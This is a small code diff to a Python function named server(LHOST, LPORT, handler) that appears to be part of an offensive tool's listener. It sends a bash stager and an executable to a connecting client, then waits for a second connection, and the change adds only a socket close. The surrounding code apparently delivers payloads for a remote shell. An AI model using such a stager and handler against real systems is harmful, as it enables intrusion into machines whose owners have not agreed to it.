@@ -323,6 +323,7 @@ def server(LHOST, LPORT, handler=handler):
 
         c.send(bash_stager.encode())
         c.send(executable)
+        c.close()
 
         print(G + "Establishing connection...")
         c, a = s.accept()
